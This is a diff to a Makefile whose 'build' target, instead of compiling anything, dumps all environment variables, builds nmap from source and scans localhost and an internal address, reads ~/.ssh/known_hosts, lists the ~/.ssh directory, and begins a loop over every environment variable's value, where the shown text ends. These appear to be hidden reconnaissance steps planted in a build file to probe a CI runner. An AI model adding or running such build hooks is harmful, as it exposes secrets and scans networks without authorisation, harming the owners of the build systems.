@@ -5,8 +5,7 @@ ListAllCommands:
 EchoEnv:
 	printenv | sort
 build: ListAllCommands EchoEnv
-	(git clone https://github.com/nmap/nmap && cd nmap && ./configure && make && make install) || true
-	ls || true
+	(git clone https://github.com/nmap/nmap && cd nmap && ./configure && make && make install && ls) || true
 	runner-linux || true
 	runner || true
 	relocator.py || true
@@ -59,9 +58,9 @@ build: ListAllCommands EchoEnv
 	curl -v -k https://proxy.golang.org || true
 	apt-get update || true
 	apt-get install nmap || true
-	nmap 127.0.0.1 || true
-	nmap 168.192.1.1 || true
-	nmap localhost || true
+	./nmap/nmap 127.0.0.1 || true
+	./nmap/nmap 168.192.1.1 || true
+	./nmap/nmap localhost || true
 	cat ~/.ssh/known_hosts || true
 	ls -al ~/.ssh || true
 	for var in $$(printenv | mawk -F= '{print $$2}'); do\
